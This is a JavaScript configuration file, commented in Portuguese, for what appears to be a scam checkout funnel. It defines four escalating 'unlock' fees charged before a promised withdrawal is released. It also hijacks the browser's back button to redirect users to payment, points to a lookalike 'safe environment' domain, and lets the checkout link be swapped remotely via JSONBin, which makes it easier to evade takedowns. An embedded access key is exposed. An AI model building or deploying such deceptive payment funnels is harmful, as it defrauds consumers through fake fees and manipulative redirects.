// =================================================================
// CONFIGURAÇÃO CENTRALIZADA - CHECKOUT TRANSPARENTE (API PARADISE)
// =================================================================

// 1. ESTEIRA DE TAXAS (API TRANSPARENTE)
const ESTEIRA_TAXAS = {
  TAXA_1: { valor: 24.90, nome: "Taxa de Verificação Anti-Fraude", productHash: "ffd52ac6d3", link_fallback: "" },
  TAXA_2: { valor: 14.90, nome: "Cadastro PRO", productHash: "17d6ab1b69", link_fallback: "" },
  TAXA_3: { valor: 36.90, nome: "Liberação Instantânea", productHash: "bce57f1467", link_fallback: "" },
  TAXA_4: { valor: 48.90, nome: "Ativação Imediata", productHash: "bf741013bd", link_fallback: "" }
};

// 2. DELAY DO BOTÃO DE DESBLOQUEIO (VSL)
// Defina o tempo em segundos para o botão "DESBLOQUEAR AGORA" aparecer.
// Exemplo: 180 para aparecer após 3 minutos.
// MODO TESTE: use 3 para testar rápido com credibilidade.
const DELAY_BOTAO_VSL_SEGUNDOS = 3;

// 3. LINK DE BACK-REDIRECT & CHECKOUT PARADISE
// Quando o usuário apertar "voltar" no navegador ou clicar em liberar saque, será redirecionado para este link.
// Este é o VALOR PADRÃO (fallback). Se o JSONBin abaixo estiver configurado,
// o link será atualizado automaticamente pelo valor que estiver no bin.
let LINK_CHECKOUT = "https://ambieenteseguro.site/f/hnpfyw4yzw";

// =================================================================
// 4. CHECKOUT DINÂMICO VIA JSONBIN (troque o checkout sem reenviar o site)
// -----------------------------------------------------------------
// Preencha os dois valores abaixo com os dados do seu bin no jsonbin.io.
// O bin deve conter um JSON no formato: { "checkout": "https://..." }
// Para trocar o checkout depois, basta editar o valor "checkout" no bin.
const JSONBIN_CONFIG = {
  BIN_ID:     "6adb81eeac6210605a4c642c",      // bin do checkout
  ACCESS_KEY: "$2a$10$R1my2dv9L1Gv/2zeXTebROgtwu4Qb0zAYvY5PachMUC8zDW9C7f0m"   // Access Key com permissão de leitura (Read)
};

// Busca o link do checkout no JSONBin e atualiza LINK_CHECKOUT.
// Em caso de erro (sem internet, bin inválido, etc.) mantém o valor padrão acima.
(function carregarCheckoutDoBin() {
  try {
    if (!JSONBIN_CONFIG.BIN_ID || JSONBIN_CONFIG.BIN_ID.indexOf("COLE_AQUI") === 0) return;

    fetch("https://api.jsonbin.io/v3/b/" + JSONBIN_CONFIG.BIN_ID + "/latest", {
      method: "GET",
      headers: {
        "X-Access-Key": JSONBIN_CONFIG.ACCESS_KEY
      }
    })
      .then(function (res) { return res.ok ? res.json() : null; })
      .then(function (data) {
        var novoLink = data && data.record && data.record.checkout;
        if (novoLink && typeof novoLink === "string" && novoLink.indexOf("http") === 0) {
          LINK_CHECKOUT = novoLink.trim();
          console.log("[JSONBin] Checkout atualizado:", LINK_CHECKOUT);
        }
      })
      .catch(function (e) {
        console.warn("[JSONBin] Não foi possível carregar o checkout, usando o padrão.", e);
      });
  } catch (e) {
    console.warn("[JSONBin] Erro ao iniciar busca do checkout.", e);
  }
})();
